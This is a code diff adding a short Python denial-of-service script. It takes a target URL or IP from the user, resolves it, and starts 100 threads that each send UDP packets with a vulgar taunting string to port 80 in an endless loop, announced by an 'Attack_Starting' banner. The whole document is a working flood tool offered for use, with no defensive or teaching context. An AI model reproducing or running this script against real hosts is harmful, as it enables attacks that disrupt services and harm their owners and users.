@@ -1,0 +1,30 @@
+import socket
+import os
+import threading
+
+ 
+target = input("Enter url or Ip ~~> ")
+ 
+def ddos():
+ target.replace("http://", "")
+ target.replace("https://","")
+ target.replace("www.","")
+ ip = socket.gethostbyname(target)
+ port = 80
+ vv1ck = "filza_is_coming_filza_is_comin_filza_is_coming_filza_is_fucking_filza_is_fucking_"
+ 
+ os.system("figlet Attack_Starting")
+ while True:
+    sock = socket.socket(socket.AF_INET,  socket.SOCK_DGRAM)
+    sock.sendto(bytes(vv1ck,"UTF-8"), (ip,port))
+    print("↓    send packet    ↓")
+    print(port,'             ',ip)
+ 
+ 
+threads = []
+for i in range(100):
+  thread1 = threading.Thread(target=ddos)
+  thread1.start()
+  threads.append(thread1)
+for thread2 in threads:
+	  thread2.join()
